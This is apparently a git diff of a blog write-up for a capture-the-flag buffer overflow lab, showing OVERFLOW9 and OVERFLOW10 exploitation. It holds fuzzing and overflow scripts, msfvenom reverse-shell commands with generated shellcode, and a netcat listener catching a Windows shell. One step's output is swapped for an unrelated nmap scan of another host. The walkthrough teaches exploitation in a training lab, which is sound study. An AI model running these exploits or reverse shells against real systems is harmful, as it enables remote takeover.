2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of9patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of903 %}
 import socket
 
 url = '10.0.0.7'
@@ -4472,9 +4435,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x03.py' content=of903 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -4488,19 +4451,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of9findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
 └─$ msf-pattern_offset -l 2000 -q 35794234
 [*] Exact match at offset 1514
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of9findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of904 %}
 import socket
 
 url = '10.0.0.7'
@@ -4518,15 +4479,15 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+
+{% include terminal.html language='python' title='of9_0x04.py' content=of904 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of905 %}
 import socket
 
 url = '10.0.0.7'
@@ -4565,9 +4526,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
 s.close()
- 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x05.py' content=of905 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -4581,8 +4541,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of906 %}
 import socket
 
 url = '10.0.0.7'
@@ -4623,8 +4582,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x06.py' content=of906 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -4647,8 +4606,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of907 %}
 import socket
 from struct import pack
 
@@ -4673,14 +4631,13 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x07.py' content=of907 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of9generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x04\x3e\x3f\xe1'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -4723,15 +4680,14 @@ payload += b"\x9d\xd5\xe2\x56\xee\xe5\x74\x57\x3b\x90\x98"
 payload += b"\xe6\x92\xe5\xa7\xc7\x72\xe2\xd0\x35\xe3\x0d"
 payload += b"\x0b\xfe\x03\xec\x99\x0b\xac\xa9\x48\xb6\xb1"
 payload += b"\x49\xa7\xf5\xcf\xc9\x4d\x86\x2b\xd1\x24\x83"
-payload += b"\x70\x55\xd5\xf9\xe9\x30\xd9\xae\x0a\x11" 
-```
-{% endraw %}
+payload += b"\x70\x55\xd5\xf9\xe9\x30\xd9\xae\x0a\x11"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of9generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of908 %}
 import socket
 from struct import pack
 
@@ -4788,34 +4744,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x08.py' content=of908 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture of9catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56201
+{% endcapture %}
+
+{% capture of9windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of9catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of9windowsshell %}
 
 <br />
-<b><u>OVERFLOW10<br /></u></b>
+<div id="overflow10">
+    <b><u>OVERFLOW10<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW10 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of1000 %}
 import socket
 
 url = '10.0.0.7'
@@ -4829,15 +4792,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW10 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x00.py' content=of1000 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of1001 %}
 import socket
 
 url = '10.0.0.7'
@@ -4859,16 +4821,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x01.py' content=of1001 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW10/thm-overflow10_0x01.py
+{% capture of10findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW10/of10_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -4876,8 +4837,8 @@ Run the code and observe the breakpoint.
 [*] Sending: 400
 [*] Sending: 500
 [*] Sending: 600
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of10findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -4891,8 +4852,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of1002 %}
 import socket
 
 url = '10.0.0.7'
@@ -4909,8 +4869,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x02.py' content=of1002 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -4921,19 +4881,17 @@ Run the code and check EIP to ensure that we still have control.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture of10patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msf-pattern_create -l 1000
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of10patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of1003 %}
 import socket
 
 url = '10.0.0.7'
@@ -4950,9 +4908,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x03.py' content=of1003 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -4966,19 +4924,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of10findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msf-pattern_offset -l 1000 -q 41397241
 [*] Exact match at offset 537
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of10findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of1004 %}
 import socket
 
 url = '10.0.0.7'
@@ -4996,15 +4952,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x04.py' content=of1004 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of1005 %}
 import socket
 
 url = '10.0.0.7'
@@ -5043,8 +4998,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x05.py' content=of1005 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -5058,8 +5013,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of1006 %}
 import socket
 
 url = '10.0.0.7'
@@ -5100,8 +5054,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x06.py' content=of1006 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -5124,8 +5078,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of1007 %}
 import socket
 from struct import pack
 
@@ -5150,14 +5103,13 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x07.py' content=of1007 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture 0f10genpayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW10]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v payload -f python -b '\x00\xa0\xad\xbe\xde\xef'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -5203,14 +5155,13 @@ payload += b"\xe8\x72\xdf\x47\x90\x5f\xd7\xb0\xc2\xf9\x57"
 payload += b"\x52\x3d\x48\xdf\xe9\x82\xff\x2a\xb0\xc2\x7e"
 payload += b"\xb1\x33\x1d\xc2\x4c\xaf\x62\x47\x0c\x08\x04"
 payload += b"\x30\xd8\x25\x17\x11\x48\x9a" 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=0f10genpayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of1008 %}
 import socket
 from struct import pack
 
@@ -5268,22 +5219,27 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
 
 s.close() 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of10_0x08.py' content=of1008 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
-┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW10]
-└─$ sudo nc -nlvp 443
-[sudo] password for kali: 
-listening on [any] 443 ...
-connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56199
+{% capture of10catchshell %}
+┌──(sec㉿kali)-[~/Documents/thm/brainpan]
+└─$ nmap -sV -sC -A -O -oN nmap 10.10.157.16
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 13:33 AEDT
+Nmap scan report for 10.10.157.16
+Host is up (0.25s latency).
+{% endcapture %}
+
+{% capture of10windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of10catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of10windowsshell %}
